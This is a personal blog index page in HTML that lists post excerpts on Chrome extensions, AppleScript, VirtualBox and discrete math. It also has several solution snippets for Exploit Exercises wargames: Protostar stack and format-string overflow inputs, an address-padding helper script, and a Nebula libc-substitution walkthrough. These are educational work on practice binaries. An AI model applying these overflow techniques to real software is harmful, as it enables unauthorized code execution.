@@ -1,0 +1,656 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Blog - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="tutorial Chrome Extensions: Taking Screenshots With Javascript/jQuery, HTML5, Canvas This post describes how to create a completely accurate image &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta property="fb:admins" content="100001696373537" />
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/posts/2/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+        <script type="text/javascript"
+            src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+          </script>
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script src="/javascripts/md5.js"></script>
+	<script type="text/javascript">
+		$(function(){
+			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("louisrli@gmail.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/categories/projects">Sideprojects</a></li>
+  <li><a href="/publications">Publications</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+
+<section class="aboutme">
+  <p>
+    Harvard student and developer.
+  </p>
+</section>
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="google" href="https://plus.google.com/106125247318074050350" rel="author" title="Google+">Google+</a>
+		
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><div class="blog-index">
+  
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-01-16T00:00:00-08:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/tutorial/'>tutorial</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2013/01/16/javascript-canvas-screenshot/" itemprop="url">Chrome Extensions: Taking Screenshots With Javascript/jQuery, HTML5, Canvas</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>This post describes how to create a completely accurate image preview of a DOM element on the page by using Javascript in a Chrome extension. I stumbled upon this issue while working on a web implementation of <a href="http://www.mendeley.com/research/enhanced-area-cursors-reducing-fine-pointing-demands-people-motor-impairments/">click-and-cross (Findlater et al.)</a> for research. This process consists of two subproblems.</p>
+
+<ol>
+  <li>How can we take a screenshot of the current page using Javascript?</li>
+  <li>Given the screenshot of part of the page, how can we crop out our element from the screenshot?</li>
+</ol>
+
+
+		
+		<a href="/blog/2013/01/16/javascript-canvas-screenshot/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-01-15T00:00:00-08:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/tutorial/'>tutorial</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2013/01/15/applescript-volume/" itemprop="url">Using Quicksilver Mac and AppleScript to Adjust System Volume</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>I’ve been using <a href="http://qsapp.com/">Quicksilver</a> for a while, and I’d heard of how powerful but never taken advantage of it. I wanted to adjust the system volume through Quicksilver: right now, I have to use <code>fn</code> + <code>f10</code> / <code>f11</code> / <code>f12</code> to adjust volume, since I chose to have <code>f1</code>-<code>f12</code> map to the normal keys.</p>
+
+<p>It seems that there’s actually no Quicksilver plugin for system volume – only iTunes volume – but it’s pretty simple to do with AppleScripts. It’s not documented everywhere, so I thought I’d add it here.</p>
+
+
+		
+		<a href="/blog/2013/01/15/applescript-volume/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-01-12T00:00:00-08:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2013/01/12/sideprojects-2012/" itemprop="url">2012 in Sideprojects</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>It always surprises me how long a year is. It’s hard for me to believe that some of these projects were a year ago, but I’m happy to see my progress. Here’s a walk down memory lane for my projects in 2012, not including course projects and research.</p>
+
+<p><a id="exploits" style="visibility:hidden;"> </a></p>
+
+<h3 id="exploit-exercises-protostar-nebula">Exploit Exercises: Protostar, Nebula</h3>
+
+<dl>
+  <dt>Description</dt>
+  <dd>A series of security wargames from <a href="http://exploit-exercises.com">Exploit Exercises</a>.</dd>
+  <dt>Languages &amp; Tools</dt>
+  <dd>shell, C, assembly and shellcode, command line tools, compilation and libraries</dd>
+  <dt>Other</dt>
+  <dd>These were both fun and educational. These problems required a good deal of persistence. Topics ranged from: buffer overflows, shell code, stack layout, library linking, race conditions, format strings, command line tools, networking. I’ve posted the solutions on this site for the format string, stack, and shell exploit sections.</dd>
+  <dt>Links</dt>
+  <dd><a href="http://louisrli.github.com/sideprojects/2012/06/22/nebula0">Nebula shell solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/18/protostar-stack0">Protostar stack solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/29/protostar-format0">Protostar format solutions</a></dd>
+</dl>
+
+
+		
+		<a href="/blog/2013/01/12/sideprojects-2012/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-22T00:00:00-08:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/knowledge/'>knowledge</a>, <a class='category' href='/blog/categories/math/'>math</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/12/22/discrete-math-paper/" itemprop="url">Looking Forward to Discrete Mathematics</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>For one of my math classes this semester (Sets and Topology), we had a short project: a three-to-five page paper on some area in mathematics. I opted for discrete mathematics, which is a topic on the broad side; five pages, of course.</p>
+
+
+		
+		<a href="/blog/2012/12/22/discrete-math-paper/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-30T00:00:00-07:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/tutorial/'>tutorial</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/30/virtualbox-ipv6-ssh/" itemprop="url">Enabling VirtualBox SSH on IPv6 (Linux Host, Linux Guest)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>This is a quick article describing how to SSH to a VirtualBox machine from the host machine, written for VirtualBox 4.1.18 Fedora. The standard choice – bridged networking – doesn’t work when the host has an IPv6 address.</p>
+
+
+		
+		<a href="/blog/2012/08/30/virtualbox-ipv6-ssh/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-29T00:00:00-07:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/29/protostar-format0/" itemprop="url">Protostar Format String Exploits (Solutions 0-4)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>
+
+<h1 id="solutions">Solutions</h1>
+<p>## Format: Level 0
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>
+
+<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format0 %64s<span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xef\xbe\xad\xde&quot;&#39;</span><span class="k">)</span>
+
+<span class="go">you have hit the target correctly :)</span></code></pre></div>
+
+
+		
+		<a href="/blog/2012/08/29/protostar-format0/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-28T00:00:00-07:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/28/protostar-stack2/" itemprop="url">Protostar Stack Exploits (Solutions 6-7)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>
+
+<h1 id="solutions">Solutions</h1>
+<p>## Stack 6
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>
+
+<h3 id="utilities">Utilities</h3>
+<p>We’ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>
+
+<p><code>~/try-address.sh</code>:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="c"># Takes an offset and unlimited 4-byte addresses and prints it in little-endian order</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span>-lt <span class="m">2</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">&quot;usage: $0 OFFSET ADDRESS. Example: $0 80 0xdeadbeef 0xf00f00f0&quot;</span>
+    <span class="nb">exit </span>1
+<span class="k">fi</span>
+
+perl -e <span class="s2">&quot;print &#39;A&#39;x$1&quot;</span>
+<span class="nb">shift</span>
+<span class="k">for</span> addr in <span class="nv">$@</span><span class="p">;</span> <span class="k">do</span>
+    <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">8</span> -2 2<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -ne <span class="s2">&quot;\x${addr:$i:2}&quot;</span><span class="p">;</span> <span class="k">done</span>
+<span class="k">done</span></code></pre></div>
+
+
+		
+		<a href="/blog/2012/08/28/protostar-stack2/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-24T00:00:00-07:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/24/protostar-stack1/" itemprop="url">Protostar Stack Exploits (Solutions 4-5)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>
+
+<h1 id="solutions">Solutions</h1>
+<p>## Stack: Level 4
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>
+
+<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code>main</code>.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gdb ./stack4</code></pre></div>
+
+
+		
+		<a href="/blog/2012/08/24/protostar-stack1/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-18T00:00:00-07:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/18/protostar-stack0/" itemprop="url">Protostar Stack Exploits (Solutions 0-3)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>
+
+<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>
+
+<h1 id="solutions">Solutions</h1>
+<p>## Stack: Level 0
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> perl -e <span class="s2">&quot;print &#39;a&#39;x65&quot;</span> <span class="p">|</span> ./stack0
+<span class="go">you have changed the &#39;modified&#39; variable</span></code></pre></div>
+
+<h2 id="stack-level-1">Stack: Level 1</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./stack1 <span class="k">$(</span>perl -e <span class="s2">&quot;print &#39;a&#39;x64 . dcba&quot;</span><span class="k">)</span>
+<span class="go">you have correctly got the variable to the right value</span></code></pre></div>
+
+
+		
+		<a href="/blog/2012/08/18/protostar-stack0/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-17T00:00:00-07:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/17/nebula2/" itemprop="url">Nebula Shell Exploits (Solutions 15-19)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1 id="overview">Overview</h1>
+<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 – I was distracted by some other projects.</p>
+
+<h2 id="level-15">Level 15</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level15">(full)</a>: <code>strace</code> on the binary reveals that it searches for libraries based on <a href="http://saintaardvarkthecarpeted.com/blog/archive/2005/08/_etc_ld_so_nohwcap.html">hardware capabilities</a>.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> strace /home/flag15/flag15 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> less
+<span class="go">...</span>
+<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
+<span class="go">open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
+<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
+<span class="go">open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
+<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
+<span class="go">open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)</span>
+<span class="go">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000</span>
+<span class="go">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span>
+<span class="go">open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
+<span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
+<span class="go">...</span></code></pre></div>
+
+<p>We want to either substitute our own version of libc, overriding the <code>puts()</code> call in <code>flag15</code>, or we want to execute code in the process. While the hard part isn’t creating our own shared library, we have to figure out how to prevent <code>libc</code> from being linked into our library. This solution executes code in the makeshift <code>libc.so</code>.</p>
+
+
+		
+		<a href="/blog/2012/08/17/nebula2/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="3">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="1">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    
+  
+</aside>
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2014 - Louis Li -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'llgithub';
+      
+        
+        var disqus_script = 'count.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
